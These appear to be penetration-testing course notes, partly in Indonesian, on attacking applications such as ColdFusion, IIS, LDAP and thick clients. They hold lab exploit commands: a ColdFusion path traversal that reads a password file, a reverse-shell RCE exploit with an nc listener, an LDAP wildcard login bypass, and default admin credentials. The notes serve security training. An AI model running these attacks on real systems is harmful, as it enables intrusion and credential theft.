|[Wireshark](https://www.wireshark.org/)|[tcpdump](https://www.tcpdump.org/)|[TCPView](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview)|[Burp Suite](https://portswigger.net/burp)|

Server-side attacks: Similiar to web app attacks

Retrieving hardcoded credentials example:
1. Explore NETLOGON on SMB service
2. Downloading the tool `ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) and monitoring the process reveals that the executable indeed creates a temp file in `C:\Users\Matt\AppData\Local\Temp`.

### Exploiting Web Vulns in Thick-Client App

Three-tier applications can be susceptible to web-specific attacks like SQL Injection and Path Traversal
#### Enumeration
SKIP intinya:
- Cek process monitor
- Modify batch file as needed, misal untuk del file
- Bisa ganti ACL di AppData/Local/Temp, biar ga ngedelete sendiri
- Bisa cek di GDB
#### Attack
SKIP intinya:
- Traffic analysis pake wireshark
- Bisa hapus signature, modify source code, rebuild aplikasi
## Misc. Apps

### ColdFusion
ColdFusion is a programming language and a web application development platform based on Java. ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks.
- `cfquery` can execute SQL statements
- `cfloop` iterate through records retrieve from database

ColdFusion exposes a fair few ports by default: 80, 443, 1935 RPC, 25 SMTP, 8500 SSL, 5500 server monitor

#### Enumeration
Ways to identify coldfusion:
- Port scanning (nmap -sV)
- File extension (`.cfm`, `.cfc`)
- HTTP headers (`Server: ColdFusion`, or `X-Powered-By: ColdFusion`)
- Error messages (reference to ColdFusion-specific tags/functions)
- Default files (`admin.cfm`, `CFIDE/administrator/index.cfm`)

`8500` is a default port that ColdFusion uses for SSL. Navigating to the `IP:8500` might lists 2 directories, `CFIDE` and `cfdocs,` in the root, further indicating that ColdFusion is running on port 8500.

`/CFIDE/administrator` might loads the ColdFusion 8 Administrator login page.

### Attack
`Searchsploit` is a command-line tool for `searching and finding exploits` in the Exploit Database
```sh
searchsploit adobe coldfusion
# ...
# Adobe ColdFusion - Directory Traversal   | multiple/remote/14641.py
# ...
searchsploit -p 14641
searchsploit -p 
```

##### Path Traversal
Example vulnerable code, the directory is not validated correctly
```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

```sh
searchsploit -p 14641
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
##### Unauthenticated RCE (CVE-2009-2265)
Example vulnerable code. It does not properly validate the `cmd` variable
```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

```sh
searchsploit -p 50057
# ...Copied EDB-ID #50057's path to the clipboard
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Edit file 50057.py
```python
# ...
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

```sh
nc -lvnp 4444
python3 50057.py
```

### IIS Tilde (~)
IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the `8.3 format`) on some versions of Microsoft Internet Information Services (IIS) web servers.

When a file or folder is created on an IIS server, Windows generates a short file name in the `8.3 format`, consisting of eight characters for the file name, a period, and three characters for the extension. Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.

IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct character combinations in the URL to identify valid short file names. Once a valid short file name is detected, this information can be utilised to access the relevant resource or further enumerate the directory structure.
```
http://example.com/~a
http://example.com/~b
http://example.com/~c
...
```

When server replies with 200 OK, continue the process
```
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...
```
Once the short name `/secret~1` is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents. After obtaining the short names, those files can be directly accessed using the short names in the requests
```
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/somefi~1.txt
```
In 8.3 short file names, such as `somefi~1.txt`, the number "1" is a unique identifier that distinguishes files with similar names within the same directory.
- `somefi~1.txt` for `somefile.txt`
- `somefi~2.txt` for `somefile1.txt`

#### Enumeration
```sh
nmap -p- -sV -sC --open 10.129.191.239
```
IIS will list as `Microsoft IIS httpd 7.5`

There is a tool called `IIS-ShortName-Scanner` that can automate this task. You can find it on GitHub at the following link: [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner).
```sh
# cd /release from root repo
java -jar iis_shortname_scanner.jar 0 5 http://10.129.191.239/
```

Generate wordlist of words starting with transf
```sh
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
The result will be the lines starting with "transf" but without the file names and colons.

Gobuster enumeration
```sh
gobuster dir -u http://10.129.191.239/ -w /tmp/list.txt -x .aspx,.asp
```

### LDAP
`LDAP` (Lightweight Directory Access Protocol) is `a protocol` used to `access and manage directory information`. Contains information about network resources such as `users`, `groups`, `computers`, `printers`, and other devices. LDAP is `commonly used` for providing a `central location` for `accessing` and `managing` directory services.

Use cases:
- Authentication
- Authorization
- Directory Services
- Synchronization
2 popular implementation: OpenLDAP, AD

LDAP requests:
1. Session connection: usually to port 389 or 636
2. Request type: bind, search, etc.
3. Request parameters: DN
4. Request ID: client assigns a unique identifier

```sh
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

LDAP Injection

| Input    | Description                                                                                                                                                                                                                                          |
| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `*`      | An asterisk `*` can `match any number of characters`.                                                                                                                                                                                                |
| `( )`    | Parentheses `( )` can `group expressions`.                                                                                                                                                                                                           |
| `\|`     | A vertical bar `\|` can perform `logical OR`.                                                                                                                                                                                                        |
| `&`      | An ampersand `&` can perform `logical AND`.                                                                                                                                                                                                          |
| `(cn=*)` | Input values that try to bypass authentication or authorisation checks by injecting conditions that `always evaluate to true` can be used. For example, `(cn=*)` or `(objectClass=*)` can be used as input values for a username or password fields. |
|          |                                                                                                                                                                                                                                                      |
#### Enumeration
```sh
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
```
#### Attack
As `OpenLDAP` runs on the server, it is safe to assume that the web application running on port `80` uses LDAP for authentication.

Attempting to log in using a wildcard character (`*`) in the username and password fields grants access to the system, effectively `bypassing any authentication measures that had been implemented`.

#### Web Mass Assignment Vuln
Several frameworks offer handy mass-assignment features to lessen the workload for developers. Because of this, programmers can directly insert a whole set of user-entered data from a form into an object or database.

Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server. Reversing the code, attackers can see these parameters and by assigning values to critical unprotected parameters during the HTTP request, they can edit the data of a database and change the intended functionality of an application.

Example: Ruby on Rails
```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```
parameter:
```js
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```
Although the `User` model does not explicitly state that the `admin` attribute is accessible, the attacker can still change it because it is present in the arguments. The attacker can send this data as part of a POST request to the server to establish a user with admin privileges.

### Attacking App Connecting to Services
Applications that are connected to services often include connection strings that can be leaked if they are not protected sufficiently. 
#### ELF Executable
Using tools like [PEDA](https://github.com/longld/peda) (Python Exploit Development Assistance for GDB) we can further examine the file.
```sh
gdb ./octopus_checker
set disassembly intel
disas main
```

#### DLL
DLL file is a `Dynamically Linked Library` and it contains code that is called from other programs while they are running.
```pwsh
Get-FileMetaData .\MultimasterAPI.dll
```
Using the debugger and .NET assembly editor [dnSpy](https://github.com/0xd4d/dnSpy), we can view the source code directly.
## Honorable Mentions
| Application                                                                 | Abuse Info                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Axis2](https://axis.apache.org/axis2/java/core/)                           | This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a [webshell](https://github.com/tennc/webshell/tree/master/other/cat.aar) in the form of an AAR file (Axis2 service file). There is also a Metasploit [module](https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html) that can assist with this.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [Websphere](https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server) | Websphere has suffered from many different [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html) over the years. Furthermore, if we can log in to the administrative console with default credentials such as `system:manager` we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| [Elasticsearch](https://en.wikipedia.org/wiki/Elasticsearch)                | Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen [this](https://www.exploit-db.com/exploits/36337) before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine [Haystack](https://youtube.com/watch?v=oGO9MEIz_tI&t=54) features Elasticsearch.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| [Zabbix](https://en.wikipedia.org/wiki/Zabbix)                              | Zabbix is an open-source system and network monitoring solution that has had quite a few [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html) discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box [Zipper](https://youtube.com/watch?v=RLvFwiDK_F8&t=250) showcases how to use the Zabbix API to gain RCE.                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| [Nagios](https://en.wikipedia.org/wiki/Nagios)                              | Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials `nagiosadmin:PASSW0RD` and fingerprinting the version.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [WebLogic](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server)            | WebLogic is a Java EE application server. At the time of writing, it has 190 reported [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html). There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Wikis/Intranets                                                             | We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [DotNetNuke](https://en.wikipedia.org/wiki/DNN_\(software\))                | DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe [issues](https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html) over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| [vCenter](https://en.wikipedia.org/wiki/VCenter)                            | vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this [Apache Struts 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) that scanners like Nessus do not pick up. This [unauthenticated OVA file upload](https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/) vulnerability was disclosed in early 2021, and a PoC for [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005) was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise. |
## App Hardening
General hardening tips:
- Secure authentications
- Access control
- Disable unsafe features
- Regular updates
- Backups
- Security monitoring
- LDAP integration with AD